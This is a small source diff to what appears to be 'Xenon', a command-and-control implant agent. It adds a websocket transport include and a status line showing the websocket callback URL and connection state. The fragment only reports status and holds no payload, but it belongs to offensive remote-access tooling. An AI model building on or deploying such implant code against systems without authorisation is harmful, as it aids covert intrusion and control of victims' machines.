@@ -7,6 +7,7 @@
 #include "Parser.h"
 #include "Strategy.h"
 #include "Config.h"
+#include "TransportWebsocket.h"
 
 /** 
  * Update the sleep & jitter timers for global Xenon instance.
@@ -83,6 +84,21 @@ VOID AgentStatus(_In_ PCHAR taskUuid, _In_ PPARSER arguments)
         xenonConfig->TcpBindAddress, xenonConfig->TcpPort,
         xenonConfig->TcpSocketServer == NULL ? "DEAD" : "ALIVE",
         xenonConfig->TcpSocketClient == NULL ? "DEAD" : "ALIVE"
+    );
+
+#endif
+
+#ifdef WEBSOCKET_TRANSPORT
+
+    PackageAddFormatPrintf(
+        data,
+        FALSE,
+        "%s://%s:%u/%s -> %s\n",
+        xenonConfig->WsIsSSL ? "wss" : "ws",
+        xenonConfig->WsHostname,
+        xenonConfig->WsPort,
+        xenonConfig->WsEndpoint ? xenonConfig->WsEndpoint : "socket",
+        WebsocketIsConnected() ? "ALIVE" : "DEAD"
     );
 
 #endif
